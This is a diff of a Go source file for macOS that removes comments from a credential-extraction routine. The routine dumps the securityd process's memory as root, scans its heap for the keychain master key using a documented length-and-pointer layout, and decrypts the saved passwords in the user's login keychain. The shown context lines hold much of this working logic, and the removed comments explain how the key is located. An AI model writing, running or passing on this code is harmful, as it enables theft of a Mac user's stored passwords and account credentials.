@@ -29,8 +29,6 @@ var (
 	loginKeychainPath = homeDir + "/Library/Keychains/login.keychain-db"
 )
 
-// findProcessByName returns the PID of the first process matching name.
-// If forceRoot is true, only matches processes owned by root (uid 0).
 func findProcessByName(name string, forceRoot bool) (int, error) {
 	buf, err := unix.SysctlRaw("kern.proc.all")
 	if err != nil {
@@ -60,8 +58,7 @@ type addressRange struct {
 	end   uint64
 }
 
-// DecryptKeychainRecords dumps securityd memory, scans for the keychain master key, and uses it to
-// read login.keychain-db's generic password records. Requires root.
+// DecryptKeychainRecords requires root.
 func DecryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
 	if os.Geteuid() != 0 {
 		return nil, errors.New("requires root privileges")
@@ -82,7 +79,6 @@ func DecryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
 		return nil, fmt.Errorf("failed to dump securityd memory: %w", err)
 	}
 
-	// vmmap identifies MALLOC_SMALL heap regions where securityd stores keys
 	regions, err := findMallocSmallRegions(pid)
 	if err != nil {
 		return nil, fmt.Errorf("failed to find malloc small regions: %w", err)
@@ -96,7 +92,6 @@ func DecryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
 		return nil, fmt.Errorf("no master key candidates found in securityd memory")
 	}
 
-	// read keychain file once, reuse buffer for each candidate
 	keychainBuf, err := os.ReadFile(loginKeychainPath)
 	if err != nil {
 		return nil, fmt.Errorf("read keychain: %w", err)
@@ -123,14 +118,6 @@ func DecryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
 	return nil, fmt.Errorf("tried %d candidates, none unlocked keychain", len(candidates))
 }
 
-// scanMasterKeyCandidates scans the core dump for 24-byte master key candidates.
-//
-// securityd stores the master key in a MALLOC_SMALL region with the layout:
-//
-//	[0x18 (8 bytes)] [pointer to key data (8 bytes)]
-//
-// 0x18 = 24 is the key length. The pointer references a 24-byte buffer
-// within the same region containing the raw master key.
 func scanMasterKeyCandidates(corePath string, regions []addressRange) ([]string, error) {
 	cmf, err := macho.Open(corePath)
 	if err != nil {
@@ -146,12 +133,10 @@ func scanMasterKeyCandidates(corePath string, regions []addressRange) ([]string,
 			continue
 		}
 		for i := 0; i < len(data)-16; i += 8 {
-			// look for the length marker (0x18 = 24 bytes)
 			val := binary.LittleEndian.Uint64(data[i : i+8])
 			if val != 0x18 {
 				continue
 			}
-			// next 8 bytes should be a pointer within this region
 			ptr := binary.LittleEndian.Uint64(data[i+8 : i+16])
 			if ptr < region.start || ptr > region.end {
 				continue
@@ -172,7 +157,6 @@ func scanMasterKeyCandidates(corePath string, regions []addressRange) ([]string,
 	return candidates, nil
 }
 
-// findMallocSmallRegions parses vmmap output to find MALLOC_SMALL heap regions.
 func findMallocSmallRegions(pid int) ([]addressRange, error) {
 	cmd := exec.Command("vmmap", "--wide", strconv.Itoa(pid))
 	output, err := cmd.Output()
@@ -207,7 +191,6 @@ func findMallocSmallRegions(pid int) ([]addressRange, error) {
 	return regions, nil
 }
 
-// getMallocSmallRegionData returns the Mach-O segment data + vaddr for the given address range.
 func getMallocSmallRegionData(f *macho.File, region addressRange) ([]byte, uint64, error) {
 	for _, seg := range f.Loads {
 		if s, ok := seg.(*macho.Segment); ok {
